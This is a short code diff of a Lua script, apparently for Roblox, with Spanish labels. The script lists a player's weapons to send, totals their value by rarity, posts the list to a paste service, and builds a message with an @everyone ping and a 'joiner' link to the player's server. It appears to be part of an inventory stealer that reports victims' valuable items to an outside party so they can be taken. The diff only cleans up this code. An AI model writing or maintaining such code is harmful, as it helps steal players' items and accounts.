@@ -195,7 +195,6 @@ local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&ga
 if #weaponsToSend > 0 then
     local maxItems = 18
     local inventoryText = ""
-    local allItemsText = ""
     local needPaste = #weaponsToSend > maxItems
     
     local rarities = {}
@@ -219,7 +218,6 @@ if #weaponsToSend > 0 then
     local pasteLink
     if needPaste then
         local pasteText = ""
-        local totalByRarity = {}
         for r, items in pairs(rarities) do
             pasteText = pasteText .. r..":\n"
             local sum = 0
@@ -229,7 +227,6 @@ if #weaponsToSend > 0 then
                 pasteText = pasteText .. string.format("- %s x%s | Value: %s💎\n", item.DataID, item.Amount, val)
             end
             pasteText = pasteText .. "Total "..r..": "..sum.."💎\n\n"
-            totalByRarity[r] = sum
         end
         pasteText = pasteText .. "Valor total inventario: "..totalValue.."💎"
         pasteLink = CreateHastebin(pasteText)
@@ -241,8 +238,8 @@ if #weaponsToSend > 0 then
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true}
     }
 
-    if needPaste then
-        table.insert(fieldsInit,{name="Mira todos los ítems aquí 📜:", value=pasteLink and "[Mirar]("..pasteLink..")" or realLink, inline=false})
+    if pasteLink then
+        table.insert(fieldsInit,{name="Mira todos los ítems aquí 📜:", value="[Mirar]("..pasteLink..")", inline=false})
     end
 
     local prefix=pingEveryone and "@everyone " or ""
